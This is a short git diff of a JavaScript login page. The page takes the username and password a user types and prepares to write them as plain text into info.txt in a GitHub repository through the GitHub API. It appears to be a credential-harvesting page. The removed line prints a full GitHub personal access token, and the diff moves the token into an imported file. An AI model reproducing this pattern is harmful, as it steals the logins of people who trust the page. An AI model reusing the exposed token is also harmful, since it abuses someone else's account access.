@@ -1,3 +1,5 @@
+import { githubToken } from './pat.js'
+
 const username = document.querySelector('.username')
 const password = document.querySelector('.password')
 
@@ -9,7 +11,6 @@ document.querySelector('.loginButton').addEventListener('click', () => {
       const repoOwner = 'Arnav-lunatic'
       const repoName = 'info'
       const filePath = 'info.txt'
-      const githubToken = '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'
       const apiUrl = `https://api.github.com/repos/${repoOwner}/${repoName}/contents/${filePath}`
 
       const newTextContent = `username - "${username.value}" | password - "${password.value}"`
